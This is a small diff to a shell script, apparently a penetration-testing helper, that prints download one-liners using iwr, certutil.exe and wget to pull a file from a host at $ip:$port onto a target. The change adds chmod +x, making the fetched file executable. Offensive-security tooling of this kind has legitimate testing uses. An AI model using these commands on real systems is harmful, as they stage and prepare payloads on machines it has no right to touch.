@@ -17,7 +17,7 @@ print_commands() {
 
     echo "1. ${PINK}iwr -uri http://$ip:$port/$file -o $file ${RESET}"
     echo "2. ${PINK}certutil.exe -urlcache -split -f http://$ip/$file C:\\Windows\\temp\\$file ${RESET}"
-    echo "3. ${PINK}wget http://$ip:$port/$file ${RESET}"
+    echo "3. ${PINK}wget http://$ip:$port/$file && chmod +x $file ${RESET}"
 }
 
 # Parse command line arguments
